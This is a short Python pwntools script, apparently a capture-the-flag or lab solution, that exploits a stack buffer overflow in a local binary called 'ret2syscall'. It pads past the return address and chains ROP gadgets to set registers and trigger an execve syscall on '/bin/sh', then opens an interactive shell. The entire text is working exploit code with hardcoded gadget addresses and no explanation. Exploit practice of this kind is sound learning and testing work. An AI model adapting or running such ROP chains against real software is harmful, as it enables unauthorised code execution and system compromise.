from pwn import *

pop_eax_ret_addr = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_80_addr = 0x08049421
bin_sh_addr = 0x080be408
offset = 0x6c + 4

payload = (offset * b'A' \
	+ p32(pop_eax_ret_addr) + p32(0xb) \
	+ p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) \
	+ p32(bin_sh_addr) + p32(int_80_addr))

sh = process("./ret2syscall")
sh.sendline(payload)
sh.interactive()
